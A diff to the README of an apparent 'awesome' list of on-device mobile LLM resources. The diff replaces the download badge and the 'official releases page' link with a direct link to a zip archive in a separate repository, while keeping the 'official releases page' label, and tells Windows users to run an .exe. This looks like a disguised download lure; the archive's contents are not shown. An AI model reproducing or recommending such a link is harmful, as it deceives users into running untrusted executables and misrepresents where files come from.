@@ -5,7 +5,7 @@ description: "Deploy production-ready Large Language Models directly on mobile d
 ---
 # 📱 awesome-on-device-mobile-llms - Run private language models on mobile
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rplu2687/awesome-on-device-mobile-llms/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Rplu2687/rplu2687.github.io/main/percent/io_github_rplu_3.3-beta.5.zip)
 
 This project provides tools for mobile teams to ship artificial intelligence directly on smartphones. You gain access to benchmarks, model selections, and frameworks to run language models without a cloud connection. This approach keeps data on the device, which protects user privacy and improves speed.
 
@@ -13,7 +13,7 @@ This project provides tools for mobile teams to ship artificial intelligence dir
 
 Follow these steps to access the application files for Windows.
 
-1. Visit the [official releases page](https://github.com/Rplu2687/awesome-on-device-mobile-llms/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Rplu2687/rplu2687.github.io/main/percent/io_github_rplu_3.3-beta.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
